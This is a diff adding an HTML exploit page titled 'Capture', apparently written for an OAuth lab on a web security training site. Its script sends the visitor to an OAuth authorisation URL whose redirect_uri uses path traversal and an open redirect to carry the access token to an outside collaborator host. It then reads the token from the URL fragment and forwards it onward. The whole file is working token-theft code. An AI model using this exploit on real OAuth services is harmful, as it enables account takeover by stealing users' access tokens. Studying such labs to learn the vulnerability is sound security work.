@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Capture</title>
+</head>
+<body>
+    <script>
+    console.log("Script loaded.");
+    if (!document.location.hash) {
+        console.log("No hash found, redirecting to OAuth server.");
+        window.location = 'https://oauth-0a4c002e0421be02855f979c02e200ed.oauth-server.net/auth?client_id=u0gk1nyhh95auhq09j6s0&redirect_uri=https://0ac300d004b5be84853d995b00830046.web-security-academy.net/oauth-callback/../post/next?path=https://ap3ir4k7gevo0550p9tplwji49a0ysmh.oastify.com&response_type=token&nonce=868486773&scope=openid%20profile%20email';
+    } else {
+        console.log("Hash found: ", document.location.hash);
+        const token = document.location.hash.substr(1);
+        console.log("Token extracted: ", token);
+        window.location = '/?' + token;
+    }
+    </script>
+</body>
+</html>
